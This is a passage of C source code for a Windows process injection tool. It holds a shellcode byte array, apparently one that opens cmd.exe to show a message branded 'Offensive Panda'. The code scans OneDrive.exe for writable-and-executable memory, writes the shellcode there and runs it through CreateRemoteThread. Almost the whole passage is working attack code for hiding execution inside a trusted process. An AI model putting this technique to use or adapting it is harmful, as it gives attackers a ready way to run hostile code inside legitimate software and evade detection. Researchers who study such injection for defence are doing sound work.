	0x00, 0x64, 0x00, 0x2E, 0x00, 0x48, 0x89, 0x85, 0xD0, 0x00, 0x00, 0x00,
	0x48, 0xB8, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x20, 0x00, 0x48, 0x89,
	0x85, 0xD8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x2F, 0x00, 0x6B, 0x00, 0x20,
	0x00, 0x6D, 0x00, 0x48, 0x89, 0x85, 0xE0, 0x00, 0x00, 0x00, 0x48, 0xB8,
	0x73, 0x00, 0x67, 0x00, 0x20, 0x00, 0x2A, 0x00, 0x48, 0x89, 0x85, 0xE8,
	0x00, 0x00, 0x00, 0x48, 0xB8, 0x20, 0x00, 0x48, 0x00, 0x65, 0x00, 0x6C,
	0x00, 0x48, 0x89, 0x85, 0xF0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x6C, 0x00,
	0x6F, 0x00, 0x20, 0x00, 0x66, 0x00, 0x48, 0x89, 0x85, 0xF8, 0x00, 0x00,
	0x00, 0x48, 0xB8, 0x72, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x20, 0x00, 0x48,
	0x89, 0x85, 0x00, 0x01, 0x00, 0x00, 0x48, 0xB8, 0xF4, 0x00, 0x66, 0x00,
	0x66, 0x00, 0x65, 0x00, 0x48, 0x89, 0x85, 0x08, 0x01, 0x00, 0x00, 0x48,
	0xB8, 0x6E, 0x00, 0x73, 0x00, 0x69, 0x00, 0x76, 0x00, 0x48, 0x89, 0x85,
	0x10, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x65, 0x00, 0x20, 0x00, 0x50, 0x00,
	0x61, 0x00, 0x48, 0x89, 0x85, 0x18, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x6E,
	0x00, 0x64, 0x00, 0x61, 0x00, 0x00, 0x00, 0x48, 0x89, 0x85, 0x20, 0x01,
	0x00, 0x00, 0x48, 0xC7, 0x85, 0x28, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x48, 0x8D, 0x95, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x28,
	0x02, 0x00, 0x00, 0xFF, 0x95, 0x10, 0x02, 0x00, 0x00, 0x48, 0xC7, 0x85,
	0x38, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x50,
	0x01, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00,
	0x00, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7,
	0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30,
	0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00,
	0x00, 0x48, 0x8D, 0x85, 0x28, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x20, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x95, 0x18, 0x02,
	0x00, 0x00, 0x48, 0x8D, 0x8D, 0x38, 0x02, 0x00, 0x00, 0xFF, 0x95, 0x00,
	0x02, 0x00, 0x00, 0x48, 0x8D, 0x85, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8B,
	0xF8, 0x33, 0xC0, 0xB9, 0x58, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0xC7,
	0x85, 0x40, 0x02, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0xC7, 0x85, 0x48,
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00,
	0x48, 0x6B, 0xC0, 0x01, 0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, 0xBA, 0x08,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x00, 0x48, 0x8B, 0x4C, 0x01, 0x28,
	0xFF, 0x95, 0xF8, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xA0, 0x02, 0x00,
	0x00, 0x48, 0x8B, 0x85, 0xA0, 0x02, 0x00, 0x00, 0x48, 0xC7, 0x00, 0x28,
	0x00, 0x00, 0x00, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00,
	0x48, 0x8B, 0x8D, 0xA0, 0x02, 0x00, 0x00, 0xC7, 0x44, 0x01, 0x08, 0x05,
	0x00, 0x02, 0x00, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00,
	0x0F, 0xB7, 0x8D, 0x18, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x95, 0xA0, 0x02,
	0x00, 0x00, 0x48, 0x89, 0x4C, 0x02, 0x10, 0xB8, 0x20, 0x00, 0x00, 0x00,
	0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x8D, 0xA0, 0x02, 0x00, 0x00, 0x48,
	0x8B, 0x95, 0x20, 0x02, 0x00, 0x00, 0x48, 0x89, 0x54, 0x01, 0x18, 0x48,
	0xC7, 0x85, 0xB0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x85, 0xA0, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8D,
	0x85, 0x40, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B,
	0x85, 0x38, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0xC7, 0x44,
	0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00,
	0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48,
	0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x41, 0xB9, 0xFF, 0xFF,
	0x1F, 0x00, 0x41, 0xB8, 0xFF, 0xFF, 0x1F, 0x00, 0x48, 0x8D, 0x95, 0xB0,
	0x02, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xA8, 0x02, 0x00, 0x00, 0xFF, 0x95,
	0x08, 0x02, 0x00, 0x00, 0x89, 0x85, 0xB8, 0x02, 0x00, 0x00, 0x48, 0xB8,
	0x4E, 0x74, 0x53, 0x75, 0x73, 0x70, 0x65, 0x6E, 0x48, 0x89, 0x45, 0x10,
	0x48, 0xB8, 0x64, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x48, 0x89,
	0x45, 0x18, 0x48, 0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00,
	0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xC0, 0x02,
	0x00, 0x00, 0x33, 0xD2, 0x48, 0xC7, 0xC1, 0xFE, 0xFF, 0xFF, 0xFF, 0xFF,
	0x95, 0xC0, 0x02, 0x00, 0x00, 0x48, 0x8D, 0xA5, 0x58, 0x03, 0x00, 0x00,
	0x5F, 0x5D, 0xC3

	};
	SIZE_T shellcodesize = sizeof(shellcode);

	MEMORY_BASIC_INFORMATION mbi = {};
	LPVOID addr = 0;

	// query remote process memory information
	while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi))) {
		addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);

		// look for RWX memory regions which are not backed by an image
		if (mbi.Protect == PAGE_EXECUTE_READWRITE
			&& mbi.State == MEM_COMMIT
			&& mbi.Type == MEM_PRIVATE) {

			printf("[+] Found RWX memory: 0x%x - %#7llu bytes region\n", mbi.BaseAddress, mbi.RegionSize);


			// Copy shellcode to the RWX memory region
			SIZE_T bytesWritten;
			if (WriteProcessMemory(h, mbi.BaseAddress, shellcode, shellcodesize, &bytesWritten)) {

				printf("[+] Shellcode successfully written to process memory: 0x%x \n", mbi.BaseAddress);

				HANDLE hthread = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, 0, NULL);
				if (hthread != NULL) {
					WaitForSingleObject(hthread, 500);
					CloseHandle(hthread);
				}
			}
		}
	}
		

	return 0;
}

int main() {
	HANDLE h = NULL;
	int pid = 0;
	h = fProc("OneDrive.exe");
	pid = GetProcessId(h);
	printf("%s%d\n", pid > 0 ? "[+] Process found at pid = " : "process not found. pid = ", pid);
	findAndDO(h);
	CloseHandle(h);
	return 0;
}